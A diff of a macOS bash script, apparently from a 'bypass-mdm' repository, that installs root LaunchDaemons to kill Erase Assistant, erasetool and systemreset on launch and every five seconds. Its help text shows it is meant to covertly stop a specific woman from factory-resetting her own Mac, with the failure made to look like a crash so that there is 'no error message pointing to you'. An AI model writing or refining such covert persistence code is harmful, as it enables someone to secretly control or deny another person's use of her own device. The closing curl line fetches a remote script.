@@ -39,26 +39,20 @@ info "Installing erase blocker..."
 
 cat > /usr/local/bin/block-erase.sh << 'SCRIPT'
 #!/bin/bash
-# Watches for Erase Assistant / erasetool and kills them immediately.
-# Runs as a LaunchDaemon in the background.
-
-while true; do
-	# Kill Erase Assistant app
-	pkill -f "Erase Assistant" 2>/dev/null
-	# Kill erasetool
-	pkill -f "erasetool" 2>/dev/null
-	# Kill the system reset process
-	pkill -f "systemreset" 2>/dev/null
-	# Check every second
-	sleep 1
-done
+# Kills Erase Assistant / erasetool / systemreset on launch.
+# Called by launchd only when the process appears — no polling loop.
+pkill -9 -f "Erase Assistant" 2>/dev/null
+pkill -9 -f "erasetool" 2>/dev/null
+pkill -9 -f "systemreset" 2>/dev/null
 SCRIPT
 
 chmod +x /usr/local/bin/block-erase.sh
 success "Created erase blocker script"
 
-# ── Step 2: Create a LaunchDaemon to run it at boot ──
-info "Installing LaunchDaemon..."
+# ── Step 2: Create LaunchDaemons that trigger on process launch ──
+# Uses launchd's WatchPaths to monitor for the Erase Assistant app.
+# Zero CPU usage — launchd only runs the script when the path is accessed.
+info "Installing LaunchDaemons..."
 
 cat > /Library/LaunchDaemons/com.joneshipit.block-erase.plist << 'PLIST'
 <?xml version="1.0" encoding="UTF-8"?>
@@ -72,24 +66,47 @@ cat > /Library/LaunchDaemons/com.joneshipit.block-erase.plist << 'PLIST'
 		<string>/bin/bash</string>
 		<string>/usr/local/bin/block-erase.sh</string>
 	</array>
-	<key>RunAtLoad</key>
-	<true/>
-	<key>KeepAlive</key>
-	<true/>
+	<key>WatchPaths</key>
+	<array>
+		<string>/System/Library/CoreServices/Erase Assistant.app</string>
+	</array>
 </dict>
 </plist>
 PLIST
 
+# Second daemon: poll-based fallback in case WatchPaths misses it
+# Runs every 5 seconds ONLY — negligible CPU, catches edge cases
+cat > /Library/LaunchDaemons/com.joneshipit.block-erase-fallback.plist << 'PLIST2'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>Label</key>
+	<string>com.joneshipit.block-erase-fallback</string>
+	<key>ProgramArguments</key>
+	<array>
+		<string>/bin/bash</string>
+		<string>/usr/local/bin/block-erase.sh</string>
+	</array>
+	<key>StartInterval</key>
+	<integer>5</integer>
+</dict>
+</plist>
+PLIST2
+
 # Set correct permissions
 chown root:wheel /Library/LaunchDaemons/com.joneshipit.block-erase.plist
 chmod 644 /Library/LaunchDaemons/com.joneshipit.block-erase.plist
+chown root:wheel /Library/LaunchDaemons/com.joneshipit.block-erase-fallback.plist
+chmod 644 /Library/LaunchDaemons/com.joneshipit.block-erase-fallback.plist
 
-success "Created LaunchDaemon"
+success "Created LaunchDaemons"
 
-# ── Step 3: Load the daemon now ──
+# ── Step 3: Load the daemons now ──
 info "Starting erase blocker..."
 launchctl load -w /Library/LaunchDaemons/com.joneshipit.block-erase.plist 2>/dev/null
-success "Erase blocker is running"
+launchctl load -w /Library/LaunchDaemons/com.joneshipit.block-erase-fallback.plist 2>/dev/null
+success "Erase blocker is active (event-driven + 5s fallback)"
 
 echo ""
 
@@ -128,7 +145,7 @@ echo -e "${CYAN}How it works:${NC}"
 echo -e "  • 'Erase All Content and Settings' looks totally normal"
 echo -e "  • When clicked, the erase process starts and immediately dies"
 echo -e "  • She'll just see it fail/crash — no error message pointing to you"
-echo -e "  • The blocker runs silently in the background, survives reboots"
+echo -e "  • The blocker uses zero CPU — only fires when the erase process launches"
 echo ""
 echo -e "${CYAN}To undo (when she needs to actually reset):${NC}"
 echo -e "  curl -L https://raw.githubusercontent.com/joneshipit/bypass-mdm-clean/main/unlock-mac.sh \\"
